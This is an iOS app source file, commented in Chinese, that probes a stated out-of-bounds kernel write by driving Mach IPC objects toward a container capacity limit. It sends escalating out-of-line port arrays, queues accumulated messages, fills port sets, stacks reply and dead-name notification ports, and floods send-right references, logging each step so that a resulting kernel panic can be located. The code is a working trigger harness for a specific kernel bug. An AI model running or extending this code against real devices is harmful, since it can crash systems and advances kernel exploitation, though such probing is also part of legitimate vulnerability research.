// main.m — OOLPROBE：用 Mach IPC 的 OOL 端口数组把「容器计数」推到容量上限
//
// 目标：27.0.1 kernel 0xfffffe000ab6b660 的未受上界约束写入
//   str x9, [x13]        ; x13 = 容器基址 + 计数*16  ==> slot[计数]
//   27.2 修补为受检的 x10（见 out/KERNEL-OOB-WRITE.md §1）
// 假设：容器在 port+0x68，元素 16 字节，[+8] 是计数，
//       元素数量由用户消息（OOL 端口数组 / 累积插入）决定。
//
// 记录纪律（本文件遵守）：
//   * 每一个可能 panic 的 mach_msg 之前，先把参数写进 progress.txt 并 fsync
//   * 每一次 mach_msg 的返回码都记下来（ndjson + 人读 log）
//
// 阶段：0 基线 / A OOL 数组 / B 累积插入 / C 端口类型覆盖 / D 便宜的两条
//
// 指纹: OOLPROBE-20261101-a91f3c7e

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>

#include <mach/mach.h>
#include <mach/message.h>
#include <mach/port.h>
#include <mach/thread_switch.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>

static const char *kFP    = "OOLPROBE-20261101-a91f3c7e";
static const char *kBuild = __DATE__ " " __TIME__;

static int    gProgFd = -1;
static FILE  *gLog = NULL;
static FILE  *gNd  = NULL;
static double gT0  = 0;
static mach_port_t gSelf = MACH_PORT_NULL;

static mach_port_t gPool[4096];
static int         gPoolN = 0;

static double nowSec(void) {
    struct timeval tv; gettimeofday(&tv, NULL);
    return (double)tv.tv_sec + tv.tv_usec / 1e6 - gT0;
}

// ---------------- 名字表 ----------------
static const char *krName(int v) {
    switch ((uint32_t)v) {
        case 0:          return "KERN_SUCCESS";
        case 1:          return "KERN_INVALID_ADDRESS";
        case 2:          return "KERN_PROTECTION_FAILURE";
        case 3:          return "KERN_NO_SPACE";
        case 4:          return "KERN_INVALID_ARGUMENT";
        case 5:          return "KERN_FAILURE";
        case 6:          return "KERN_RESOURCE_SHORTAGE";
        case 7:          return "KERN_NOT_RECEIVER";
        case 8:          return "KERN_NO_ACCESS";
        case 9:          return "KERN_MEMORY_FAILURE";
        case 10:         return "KERN_MEMORY_ERROR";
        case 11:         return "KERN_NOT_SUPPORTED";
        case 12:         return "KERN_NOT_IN_SET";
        case 13:         return "KERN_NO_ACCESS2";
        case 14:         return "KERN_INVALID_CAPABILITY2";
        case 15:         return "KERN_INVALID_NAME";
        case 16:         return "KERN_INVALID_TASK";
        case 17:         return "KERN_INVALID_RIGHT";
        case 18:         return "KERN_INVALID_VALUE";
        case 19:         return "KERN_UREFS_OVERFLOW";
        case 20:         return "KERN_INVALID_CAPABILITY";
        case 21:         return "KERN_RIGHT_EXISTS";
        case 22:         return "KERN_INVALID_HOST";
        case 0x10000001: return "MACH_SEND_INTERRUPTED";
        case 0x10000002: return "MACH_SEND_INVALID_DATA";
        case 0x10000003: return "MACH_SEND_INVALID_DEST";
        case 0x10000004: return "MACH_SEND_TIMED_OUT";
        case 0x10000005: return "MACH_SEND_INVALID_VOUCHER";
        case 0x10000006: return "MACH_SEND_INTERRUPT";
        case 0x10000008: return "MACH_SEND_INVALID_REPLY";
        case 0x10000009: return "MACH_SEND_INVALID_RIGHT";
        case 0x1000000a: return "MACH_MSG_OVERDUE";
        case 0x1000000b: return "MACH_MSG_TYPE_MISMATCH";
        case 0x1000000c: return "MACH_SEND_NO_BUFFER";
        case 0x1000000d: return "MACH_SEND_TOO_LARGE";
        case 0x1000000e: return "MACH_SEND_INVALID_TYPE";
        case 0x1000000f: return "MACH_SEND_HEADER_ERROR";
        case 0x10000010: return "MACH_SEND_HEADER_TYPE_ERROR";
        case 0x10000011: return "MACH_MSG_TOO_SMALL";
        case 0x10000012: return "MACH_SEND_TRAILER_ERROR";
        case 0x10000013: return "MACH_SEND_TRAILER_TYPE_ERROR";
        case 0x10000014: return "MACH_SEND_TRAILER_INVALID_CNT";
        case 0x10000015: return "MACH_SEND_TRAILER_INVALID_FMT";
        case 0x10004001: return "MACH_RCV_INTERRUPTED";
        case 0x10004004: return "MACH_RCV_TIMED_OUT";
        case 0x10004005: return "MACH_RCV_TOO_LARGE";
        case 0x10004007: return "MACH_RCV_INVALID_DATA";
        case 0x10004008: return "MACH_RCV_INVALID_NAME";
        case 0x10004009: return "MACH_RCV_INVALID_TRAILER";
        case 0x1000400a: return "MACH_RCV_HEADER_ERROR";
        case 0x1000400b: return "MACH_RCV_TYPE_ERROR";
        case 0x1000400c: return "MACH_RCV_INVALID_TYPE";
        case 0x1000400d: return "MACH_RCV_INVALID_MSGPORT";
        default:         return "?";
    }
}

// ---------------- 落盘 ----------------
// ★ progress.txt：每一个可能 panic 的动作之前写、写出后 fsync。
static void step(NSString *tag, NSString *note) {
    char line[768];
    struct timeval tv; gettimeofday(&tv, NULL);
    snprintf(line, sizeof line, "%ld.%06d\t%s\t%s\n",
             (long)tv.tv_sec, (int)tv.tv_usec,
             tag.UTF8String, note ? note.UTF8String : "");
    if (gProgFd >= 0) { if (write(gProgFd, line, strlen(line)) < 0) {} fsync(gProgFd); }
    if (gLog) { fprintf(gLog, "%s", line); fflush(gLog); fsync(fileno(gLog)); }
    fprintf(stderr, "%s", line); fflush(stderr);
    if (gNd) {
        fprintf(gNd, "{\"k\":\"@step\",\"t\":%.3f,\"tag\":\"%s\",\"note\":\"%s\"}\n",
                nowSec(), tag.UTF8String, note ? note.UTF8String : "");
        fflush(gNd); fsync(fileno(gNd));
    }
}

static void note(NSString *s) {
    if (gLog) { fprintf(gLog, "    %s\n", s.UTF8String); fflush(gLog); fsync(fileno(gLog)); }
    fprintf(stderr, "    %s\n", s.UTF8String); fflush(stderr);
    if (gNd) {
        fprintf(gNd, "{\"k\":\"@note\",\"t\":%.3f,\"m\":\"%s\"}\n", nowSec(), s.UTF8String);
        fflush(gNd); fsync(fileno(gNd));
    }
}

// 一条结果：每次 mach_msg 的返回码都要进来
static void res(NSString *phase, NSString *param, int skr, int rkr, int haveRcv, int descCount, NSString *extra) {
    NSString *h = [NSString stringWithFormat:
        @"%@ %s send=%d(%s)%@%@%@", phase, param.UTF8String,
        skr, krName(skr),
        haveRcv ? [NSString stringWithFormat:@" rcv=%d(%s)", rkr, krName(rkr)] : @" rcv=-",
        haveRcv ? [NSString stringWithFormat:@" desc=%d", descCount] : @"",
        extra.length ? [NSString stringWithFormat:@" %@", extra] : @""];
    note(h);
    if (gNd) {
        fprintf(gNd, "{\"k\":\"@res\",\"t\":%.3f,\"phase\":\"%s\",\"p\":\"%s\",\"send\":%d,\"sendn\":\"%s\"",
                nowSec(), phase.UTF8String, param.UTF8String, skr, krName(skr));
        if (haveRcv) fprintf(gNd, ",\"rcv\":%d,\"rcvn\":\"%s\",\"desc\":%d", rkr, krName(rkr), descCount);
        if (extra.length) fprintf(gNd, ",\"x\":\"%s\"", extra.UTF8String);
        fprintf(gNd, "}\n");
        fflush(gNd); fsync(fileno(gNd));
    }
}

// ---------------- Mach 基础 ----------------
static int makeRxPorts(int n, mach_port_t *out, int max) {
    int made = 0;
    for (int i = 0; i < n && made < max; i++) {
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &p);
        if (kr != KERN_SUCCESS) { note([NSString stringWithFormat:@"mach_port_allocate 失败 @%d kr=%d(%s)", i, kr, krName(kr)]); break; }
        kr = mach_port_insert_right(gSelf, p, p, MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) { note([NSString stringWithFormat:@"insert_right(SEND) 失败 @%d kr=%d(%s)", i, kr, krName(kr)]); mach_port_mod_refs(gSelf, p, MACH_PORT_RIGHT_RECEIVE, -1); break; }
        out[made++] = p;
    }
    return made;
}

static void destroyPort(mach_port_t p) {
    if (p == MACH_PORT_NULL) return;
    mach_port_mod_refs(gSelf, p, MACH_PORT_RIGHT_SEND, -1);
    mach_port_mod_refs(gSelf, p, MACH_PORT_RIGHT_RECEIVE, -1);
}

typedef struct {
    mach_msg_header_t               hdr;
    mach_msg_body_t                 body;
    mach_msg_ool_ports_descriptor_t d;
} OOLMsg;

// OOL 端口数组消息（核心探针）
static mach_msg_return_t sendOOL(mach_port_t dest,
                                 mach_port_t *names, uint32_t count,
                                 mach_msg_copy_options_t copy, int dealloc,
                                 mach_port_t replyName, mach_msg_type_name_t replyType,
                                 mach_msg_timeout_t tmo) {
    OOLMsg m; memset(&m, 0, sizeof m);
    m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, replyType) | MACH_MSGH_BITS_COMPLEX;
    m.hdr.msgh_remote_port = dest;
    m.hdr.msgh_local_port  = replyName;
    m.hdr.msgh_size        = (mach_msg_size_t)sizeof(OOLMsg);
    m.hdr.msgh_id          = 0x4f4f4c50;   // "OOLP"
    m.body.msgh_descriptor_count = 1;
    m.d.address    = names;
    m.d.count      = (mach_msg_size_t)count;
    m.d.copy       = copy;
    m.d.deallocate = (unsigned int)(dealloc ? 1 : 0);
    m.d.type       = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    m.d.disposition = MACH_MSG_TYPE_COPY_SEND;   // 关键：拷贝而非移动，权限不被消费
    (void)tmo;
    m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, replyType) | MACH_MSGH_BITS_COMPLEX;
    return mach_msg(&m.hdr, MACH_SEND_MSG,
                    (mach_msg_size_t)sizeof(OOLMsg), 0,
                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

// 简单消息（无描述符），可带 reply 端口权限
static mach_msg_return_t sendSimple(mach_port_t dest, mach_port_t replyName,
                                    mach_msg_type_name_t replyType,
                                    mach_msg_timeout_t tmo) {
    struct { mach_msg_header_t hdr; uint32_t payload; } m;
    memset(&m, 0, sizeof m);
    m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, replyType);
    m.hdr.msgh_remote_port = dest;
    m.hdr.msgh_local_port  = replyName;
    m.hdr.msgh_size        = (mach_msg_size_t)sizeof m;
    m.hdr.msgh_id          = 0x4f4f4c53;   // "OOLS"
    m.payload              = 0xdeadbeef;
    return mach_msg(&m.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                    (mach_msg_size_t)sizeof m, 0, MACH_PORT_NULL, tmo, MACH_PORT_NULL);
}

// 接收一条（带描述符计数），随后 destroy
static mach_msg_return_t recvOne(mach_port_t rx, mach_msg_timeout_t tmo, uint32_t *descCount) {
    union { mach_msg_header_t h; uint8_t raw[8192]; } u;
    memset(&u, 0, sizeof u);
    mach_msg_return_t kr = mach_msg(&u.h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                    0, (mach_msg_size_t)sizeof(u.raw), rx, tmo, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS) {
        uint32_t n = 0;
        if (u.h.msgh_bits & MACH_MSGH_BITS_COMPLEX) {
            mach_msg_body_t *b = (mach_msg_body_t *)((uint8_t *)&u.h + sizeof(mach_msg_header_t));
            n = b->msgh_descriptor_count;
        }
        if (descCount) *descCount = n;
        mach_msg_destroy(&u.h);
    }
    return kr;
}

// qlimit：mach_port_set_qlimit 已从公开头文件移除，改用 mach_port_set_attributes
static kern_return_t setQLimit(mach_port_t p, mach_port_msgcount_t q) {
    mach_port_limits_t lim; memset(&lim, 0, sizeof lim);
    lim.mpl_qlimit = q;
    return mach_port_set_attributes(gSelf, p, MACH_PORT_LIMITS_INFO,
                                    (mach_port_info_t)&lim, MACH_PORT_LIMITS_INFO_COUNT);
}

static void sleep_ms(int ms) { usleep((useconds_t)ms * 1000); }

// ================= 阶段 0：安全基线 =================
static void phase0(void) {
    step(@"0", @"baseline");
    mach_port_t rx = MACH_PORT_NULL;
    kern_return_t k1 = mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &rx);
    if (k1 != KERN_SUCCESS) { res(@"0", @"mach_port_allocate", k1, 0, 0, 0, @"拿不到接收端口，基线失败"); return; }
    k1 = mach_port_insert_right(gSelf, rx, rx, MACH_MSG_TYPE_MAKE_SEND);

    step(@"0", @"baseline/send-empty");
    mach_msg_return_t skr = sendSimple(rx, MACH_PORT_NULL, 0, 500);
    mach_msg_return_t rkr = (skr == MACH_MSG_SUCCESS) ? recvOne(rx, 500, NULL) : 0;
    res(@"0", @"empty-roundtrip", skr, rkr, skr == MACH_MSG_SUCCESS, 0, nil);

    step(@"0", @"baseline/destroy");
    destroyPort(rx);
    res(@"0", @"destroy", 0, 0, 0, 0, (skr == MACH_MSG_SUCCESS && rkr == MACH_MSG_SUCCESS)
        ? @"BASELINE ok" : @"BASELINE 异常（见上）");
}

// ================= 阶段 A：OOL 端口数组，逐步推高 N =================
static void phaseA(void) {
    note([NSString stringWithFormat:@"A: gPoolN=%d", gPoolN]);
    static const uint32_t Ns[] = { 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384 };
    mach_port_t rx = MACH_PORT_NULL;
    if (mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &rx) != KERN_SUCCESS) {
        note(@"A: 拿不到接收端口"); return;
    }
    mach_port_insert_right(gSelf, rx, rx, MACH_MSG_TYPE_MAKE_SEND);
    setQLimit(rx, 512);

    mach_port_t *arr = (mach_port_t *)calloc(16384, sizeof(mach_port_t));
    if (!arr) { note(@"A: 数组分配失败"); return; }

    for (int ri = 0; ri < (int)(sizeof(Ns) / sizeof(Ns[0])); ri++) {
        uint32_t N = Ns[ri];
        for (int ci = 0; ci < 2; ci++) {
            mach_msg_copy_options_t copy = ci ? MACH_MSG_VIRTUAL_COPY : MACH_MSG_PHYSICAL_COPY;
            const char *cn = ci ? "VIRTUAL" : "PHYSICAL";
            if (N > 0 && gPoolN == 0) { note(@"A: 端口池为空"); return; }
            if ((int)N > gPoolN) {
                res(@"A", [NSString stringWithFormat:@"N=%u/%s", N, cn], 0, 0, 0, 0,
                    [NSString stringWithFormat:@"SKIP: gPoolN=%d < N", gPoolN]);
                continue;
            }
            for (uint32_t i = 0; i < N; i++) arr[i] = gPool[i];

            step(@"A", [NSString stringWithFormat:@"N=%u copy=%s", N, cn]);
            mach_msg_return_t skr = sendOOL(rx, arr, N, copy, 0, MACH_PORT_NULL, 0, 1500);

            mach_msg_return_t rkr = 0; uint32_t desc = 0; int haveRcv = 0;
            if (skr == MACH_MSG_SUCCESS) {
                rkr = recvOne(rx, 1500, &desc);
                haveRcv = 1;
            }
            res(@"A", [NSString stringWithFormat:@"N=%u/%s", N, cn], skr, rkr, haveRcv, (int)desc,
                [NSString stringWithFormat:@"pool=%d%@", gPoolN,
                 (N > (uint32_t)gPoolN) ? @",cyclic" : @",distinct"]);
            step(@"A", [NSString stringWithFormat:@"N=%u copy=%s done", N, cn]);
            sleep_ms(200);   // 每个 N 之间 200ms
        }
    }
    free(arr);
    destroyPort(rx);
}

// ================= 阶段 B：累积插入（多条消息不接收） =================
static void phaseB(void) {
    static const int Ks[] = { 8, 64, 512, 4096 };
    mach_port_t rx = MACH_PORT_NULL;
    if (mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &rx) != KERN_SUCCESS) { note(@"B: 无端口"); return; }
    mach_port_insert_right(gSelf, rx, rx, MACH_MSG_TYPE_MAKE_SEND);
    mach_port_t one = gPoolN ? gPool[0] : rx;

    for (int t = 0; t < 4; t++) {
        int K = Ks[t];
        kern_return_t qk = setQLimit(rx, (mach_port_msgcount_t)(K + 8));
        step(@"B", [NSString stringWithFormat:@"K=%d qlimit=%d qkr=%d", K, K + 8, qk]);

        int sent = 0, bad = 0; int firstBad = 0, firstBadAt = -1;
        for (int i = 0; i < K; i++) {
            if ((i & 31) == 0) step(@"B", [NSString stringWithFormat:@"K=%d i=%d", K, i]);
            mach_msg_return_t kr = sendOOL(rx, &one, 1, MACH_MSG_PHYSICAL_COPY, 0, MACH_PORT_NULL, 0, 600);
            if (kr == MACH_MSG_SUCCESS) sent++;
            else { if (!firstBad) { firstBad = kr; firstBadAt = i; } bad++; break; }
        }
        res(@"B", [NSString stringWithFormat:@"K=%d", K], firstBad, 0, 0, 0,
            [NSString stringWithFormat:@"sent=%d bad=%d firstBadAt=%d qlimit_kr=%d",
             sent, bad, firstBadAt, qk]);
        step(@"B", [NSString stringWithFormat:@"K=%d drain", K]);

        // 排空
        int drained = 0;
        for (int i = 0; i < sent; i++) {
            if (recvOne(rx, 300, NULL) != MACH_MSG_SUCCESS) break;
            drained++;
        }
        res(@"B", [NSString stringWithFormat:@"K=%d/drain", K], 0, 0, 0, 0,
            [NSString stringWithFormat:@"drained=%d of %d", drained, sent]);
        step(@"B", [NSString stringWithFormat:@"K=%d done", K]);
    }
    destroyPort(rx);
}

// ================= 阶段 C1：port set 大量移入成员 =================
static void phaseC1(void) {
    mach_port_t ps = MACH_PORT_NULL;
    kern_return_t k = mach_port_allocate(gSelf, MACH_PORT_RIGHT_PORT_SET, &ps);
    step(@"C1", [NSString stringWithFormat:@"portset kr=%d", k]);
    if (k != KERN_SUCCESS) { res(@"C1", @"mach_port_allocate(PORT_SET)", k, 0, 0, 0, nil); return; }

    static const int Ms[] = { 256, 1024, 2048 };
    int have = 0;
    mach_port_t *ps_arr = (mach_port_t *)calloc(2048, sizeof(mach_port_t));
    if (!ps_arr) return;

    for (int t = 0; t < 3; t++) {
        int target = Ms[t];
        int add = target - have;
        step(@"C1", [NSString stringWithFormat:@"M=%d add=%d", target, add]);
        int ok = 0, bad = 0; int firstBad = 0;
        for (int i = 0; i < add; i++) {
            if ((i & 31) == 0) step(@"C1", [NSString stringWithFormat:@"M=%d i=%d", target, i]);
            mach_port_t p = MACH_PORT_NULL;
            kern_return_t a = mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &p);
            if (a != KERN_SUCCESS) { firstBad = a; bad++; break; }
            mach_port_insert_right(gSelf, p, p, MACH_MSG_TYPE_MAKE_SEND);
            kern_return_t mv = mach_port_move_member(gSelf, p, ps);
            if (mv != KERN_SUCCESS) { firstBad = mv; bad++; break; }
            ps_arr[have++] = p;
            ok++;
        }
        res(@"C1", [NSString stringWithFormat:@"M=%d", target], firstBad, 0, 0, 0,
            [NSString stringWithFormat:@"added=%d total=%d bad=%d", ok, have, bad]);

        // 给 port set 发一条带 N=512 OOL 数组的消息，再从 set 上收
        if (gPoolN > 0) {
            mach_port_t arr[512];
            for (int i = 0; i < 512; i++) arr[i] = gPool[i % gPoolN];
            step(@"C1", [NSString stringWithFormat:@"M=%d ool512->set", target]);
            mach_msg_return_t skr = sendOOL(ps, arr, 512, MACH_MSG_PHYSICAL_COPY, 0, MACH_PORT_NULL, 0, 1500);
            mach_msg_return_t rkr = 0; uint32_t d = 0; int hr = 0;
            if (skr == MACH_MSG_SUCCESS) { rkr = recvOne(ps, 1500, &d); hr = 1; }
            res(@"C1", [NSString stringWithFormat:@"M=%d ool512->set", target], skr, rkr, hr, (int)d, nil);
        }
        sleep_ms(200);
    }
    // 收尾：销毁成员与 set
    for (int i = 0; i < have; i++) destroyPort(ps_arr[i]);
    mach_port_mod_refs(gSelf, ps, MACH_PORT_RIGHT_PORT_SET, -1);
    free(ps_arr);
}

// ================= 阶段 C2：reply / special reply port 累积 =================
static void phaseC2(void) {
    mach_port_t rx = MACH_PORT_NULL, rp = MACH_PORT_NULL;
    if (mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &rx) != KERN_SUCCESS) { note(@"C2: 无 rx"); return; }
    mach_port_insert_right(gSelf, rx, rx, MACH_MSG_TYPE_MAKE_SEND);
    if (mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &rp) != KERN_SUCCESS) { note(@"C2: 无 reply 端口"); return; }

    static const int Ks[] = { 8, 64, 512, 4096 };
    for (int t = 0; t < 4; t++) {
        int K = Ks[t];
        kern_return_t qk = setQLimit(rx, (mach_port_msgcount_t)(K + 8));
        step(@"C2", [NSString stringWithFormat:@"reply K=%d qkr=%d", K, qk]);
        int sent = 0, bad = 0, firstBad = 0, firstBadAt = -1;
        for (int i = 0; i < K; i++) {
            if ((i & 31) == 0) step(@"C2", [NSString stringWithFormat:@"reply K=%d i=%d", K, i]);
            // reply 字段给 MAKE_SEND_ONCE ==> 对端得到一个 send-once（reply port）
            mach_msg_return_t kr = sendSimple(rx, rp, MACH_MSG_TYPE_MAKE_SEND_ONCE, 600);
            if (kr == MACH_MSG_SUCCESS) sent++;
            else { if (!firstBad) { firstBad = kr; firstBadAt = i; } bad++; break; }
        }
        res(@"C2", [NSString stringWithFormat:@"reply K=%d", K], firstBad, 0, 0, 0,
            [NSString stringWithFormat:@"sent=%d bad=%d firstBadAt=%d", sent, bad, firstBadAt]);
        int drained = 0;
        step(@"C2", [NSString stringWithFormat:@"reply K=%d drain", K]);
        for (int i = 0; i < sent; i++) { if (recvOne(rx, 300, NULL) != MACH_MSG_SUCCESS) break; drained++; }
        res(@"C2", [NSString stringWithFormat:@"reply K=%d/drain", K], 0, 0, 0, 0,
            [NSString stringWithFormat:@"drained=%d of %d", drained, sent]);
    }

    // special reply port（若 libsystem 暴露）
    mach_port_t (*getSRP)(void) = (mach_port_t (*)(void))dlsym(RTLD_DEFAULT, "thread_get_special_reply_port");
    if (!getSRP) getSRP = (mach_port_t (*)(void))dlsym(RTLD_DEFAULT, "thread_set_special_reply_port");
    if (!getSRP) {
        res(@"C2", @"special_reply_port", 0, 0, 0, 0, @"符号不存在，跳过（记录为 N/A）");
    } else {
        int sent = 0, bad = 0, firstBad = 0;
        setQLimit(rx, 600);
        step(@"C2", @"special_reply K=256");
        for (int i = 0; i < 256; i++) {
            if ((i & 15) == 0) step(@"C2", [NSString stringWithFormat:@"special_reply K=256 i=%d", i]);
            mach_port_t srp = getSRP();
            if (srp == MACH_PORT_NULL) { firstBad = KERN_INVALID_VALUE; bad++; break; }
            mach_msg_return_t kr = sendSimple(rx, srp, MACH_MSG_TYPE_MOVE_SEND_ONCE, 600);
            if (kr == MACH_MSG_SUCCESS) sent++; else { if (!firstBad) firstBad = kr; bad++; break; }
        }
        res(@"C2", @"special_reply K=256", firstBad, 0, 0, 0,
            [NSString stringWithFormat:@"sent=%d bad=%d", sent, bad]);
        for (int i = 0; i < sent; i++) { if (recvOne(rx, 300, NULL) != MACH_MSG_SUCCESS) break; }
    }
    destroyPort(rp);
    destroyPort(rx);
}

// ================= 阶段 C3：notification port 累积 =================
static void phaseC3(void) {
    mach_port_t np = MACH_PORT_NULL;
    if (mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &np) != KERN_SUCCESS) { note(@"C3: 无端口"); return; }
    mach_port_insert_right(gSelf, np, np, MACH_MSG_TYPE_MAKE_SEND);

    static const int Ks[] = { 64, 512 };
    for (int t = 0; t < 2; t++) {
        int K = Ks[t];
        setQLimit(np, (mach_port_msgcount_t)(K + 8));
        step(@"C3", [NSString stringWithFormat:@"notify K=%d", K]);
        int reg = 0, bad = 0, firstBad = 0;
        for (int i = 0; i < K; i++) {
            if ((i & 31) == 0) step(@"C3", [NSString stringWithFormat:@"notify K=%d i=%d", K, i]);
            mach_port_t tp = MACH_PORT_NULL;
            kern_return_t a = mach_port_allocate(gSelf, MACH_PORT_RIGHT_RECEIVE, &tp);
            if (a != KERN_SUCCESS) { firstBad = a; bad++; break; }
            mach_port_insert_right(gSelf, tp, tp, MACH_MSG_TYPE_MAKE_SEND);
            kern_return_t rq = mach_port_request_notification(gSelf, tp, MACH_NOTIFY_DEAD_NAME, 0,
                                                             np, MACH_MSG_TYPE_MAKE_SEND, NULL);
            if (rq != KERN_SUCCESS) { firstBad = rq; bad++; destroyPort(tp); break; }
            // 让目标端口死掉 ==> 排一条 DEAD_NAME 通知到 np
            destroyPort(tp);
            reg++;
        }
        res(@"C3", [NSString stringWithFormat:@"notify K=%d", K], firstBad, 0, 0, 0,
            [NSString stringWithFormat:@"registered=%d bad=%d", reg, bad]);
        int drained = 0;
        for (int i = 0; i < reg; i++) { if (recvOne(np, 300, NULL) != MACH_MSG_SUCCESS) break; drained++; }
        res(@"C3", [NSString stringWithFormat:@"notify K=%d/drain", K], 0, 0, 0, 0,
            [NSString stringWithFormat:@"drained=%d of %d", drained, reg]);
    }
    destroyPort(np);
}

// ================= 阶段 D：便宜的兩条 =================
static void phaseD(void) {
    if (gPoolN == 0) { note(@"D: 端口池为空"); return; }
    mach_port_t p = gPool[0];

    static const int big[] = { 65536, 1000000 };
    for (int i = 0; i < 2; i++) {
        step(@"D1", [NSString stringWithFormat:@"mod_refs SEND +%d", big[i]]);
        kern_return_t kr = mach_port_mod_refs(gSelf, p, MACH_PORT_RIGHT_SEND, big[i]);
        res(@"D1", [NSString stringWithFormat:@"mod_refs +%d", big[i]], kr, 0, 0, 0, nil);
        // 回撤
        kern_return_t kb = mach_port_mod_refs(gSelf, p, MACH_PORT_RIGHT_SEND, -big[i]);
        res(@"D1", [NSString stringWithFormat:@"mod_refs -%d", big[i]], kb, 0, 0, 0, nil);
    }

    step(@"D2", @"insert_right COPY_SEND x50000");
    int ok = 0, bad = 0, firstBad = 0;
    mach_port_name_t last = MACH_PORT_NULL;
    for (int i = 0; i < 50000; i++) {
        if ((i & 1023) == 0) step(@"D2", [NSString stringWithFormat:@"insert_right i=%d", i]);
        mach_port_name_t nn = MACH_PORT_NULL;
        kern_return_t kr = mach_port_insert_right(gSelf, p, nn, MACH_MSG_TYPE_COPY_SEND);
        if (kr == KERN_SUCCESS) { ok++; last = nn; }
        else { if (!firstBad) firstBad = kr; bad++; if (bad > 8) break; }
        if ((i & 1023) == 1023) { if (last != MACH_PORT_NULL) mach_port_deallocate(gSelf, last); last = MACH_PORT_NULL; }
    }
    if (last != MACH_PORT_NULL) mach_port_deallocate(gSelf, last);
    res(@"D2", @"insert_right x50000", firstBad, 0, 0, 0,
        [NSString stringWithFormat:@"ok=%d bad=%d", ok, bad]);

    // D3：大量端口 create/destroy 循环（容器增长/收缩）
    step(@"D3", @"churn 2048");
    int made = 0;
    mach_port_t *tmp = (mach_port_t *)calloc(2048, sizeof(mach_port_t));
    if (tmp) {
        made = makeRxPorts(2048, tmp, 2048);
        res(@"D3", @"churn create", 0, 0, 0, 0, [NSString stringWithFormat:@"made=%d", made]);
        for (int i = 0; i < made; i++) destroyPort(tmp[i]);
        free(tmp);
    }
    res(@"D3", @"churn destroy", 0, 0, 0, 0, [NSString stringWithFormat:@"made=%d", made]);
}

// ================= 驱动 =================
static void runProbe(void) {
    gSelf = mach_task_self();
    step(@"@start", [NSString stringWithFormat:@"fp=%s build=%s pid=%d", kFP, kBuild, (int)getpid()]);
    // @meta 双校验用：probe 名 + 二进制戳记
    if (gNd) {
        fprintf(gNd, "{\"k\":\"@meta\",\"probe\":\"oolprobe\",\"fp\":\"%s\",\"build\":\"%s\"}\n", kFP, kBuild);
        fflush(gNd); fsync(fileno(gNd));
    }

    step(@"pool", @"allocate 4096 rx ports");
    gPoolN = makeRxPorts(4096, gPool, 4096);
    res(@"pool", @"makeRxPorts", 0, 0, 0, 0, [NSString stringWithFormat:@"poolN=%d", gPoolN]);

    phase0();
    phaseA();
    // A 之后端口池保留给 B/C；B 结束才释放
    phaseB();
    phaseC1();
    phaseC2();
    phaseC3();
    phaseD();

    step(@"@done", @"all phases");
    if (gNd) { fprintf(gNd, "{\"k\":\"@done\",\"t\":%.3f}\n", nowSec()); fflush(gNd); fsync(fileno(gNd)); }
    note(@"=== OOLPROBE 全序列跑完，无 panic ===");
}

// ---------------- App ----------------
@interface AD : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UILabel *label;
@end

@implementation AD
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)o {
    struct timeval tv; gettimeofday(&tv, NULL); gT0 = tv.tv_sec + tv.tv_usec / 1e6;

    NSString *dir = NSTemporaryDirectory();
    gProgFd = open([[dir stringByAppendingPathComponent:@"progress.txt"] UTF8String],
                   O_WRONLY | O_CREAT | O_TRUNC, 0600);
    gLog = fopen([[dir stringByAppendingPathComponent:@"oolprobe.log"] UTF8String], "w");
    gNd  = fopen([[dir stringByAppendingPathComponent:@"oolprobe.ndjson"] UTF8String], "w");

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *root = [UIViewController new];
    root.view.backgroundColor = [UIColor blackColor];
    UILabel *lab = [[UILabel alloc] initWithFrame:UIScreen.mainScreen.bounds];
    lab.text = @"oolprobe…";
    lab.textColor = [UIColor greenColor];
    lab.numberOfLines = 0;
    lab.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    [root.view addSubview:lab];
    self.label = lab;
    self.window.rootViewController = root;
    [self.window makeKeyAndVisible];
    [UIApplication sharedApplication].idleTimerDisabled = YES;   // 屏幕常亮

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(170 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{ exit(0); });    // 看门狗

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            runProbe();
            if (gLog) { fflush(gLog); fsync(fileno(gLog)); }
            if (gNd)  { fflush(gNd);  fsync(fileno(gNd));  }
            if (gProgFd >= 0) fsync(gProgFd);
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                           dispatch_get_main_queue(), ^{ exit(0); });
        }
    });
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AD class]));
    }
}
